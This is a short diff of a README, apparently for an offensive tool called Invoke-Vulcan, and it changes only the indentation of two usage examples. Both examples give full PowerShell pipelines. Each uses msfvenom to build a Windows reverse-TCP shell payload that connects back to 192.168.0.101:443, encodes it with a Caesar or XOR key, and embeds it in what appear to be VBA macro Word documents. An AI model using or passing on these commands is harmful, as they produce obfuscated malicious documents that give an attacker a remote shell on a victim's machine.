@@ -80,7 +80,7 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-Caesar -Key 5 | `
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\caesar.vba" -Key 5 -Verbose
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\caesar.vba" -Key 5 -Verbose
     ```
 
 - Embed a `XOR`-encoded shellcode:
@@ -88,7 +88,7 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-XOR -Key "Star&WatchThisRepository" | `
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -Key "Star&WatchThisRepository" -Verbose
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -Key "Star&WatchThisRepository" -Verbose
     ```
 
     > [!WARNING]
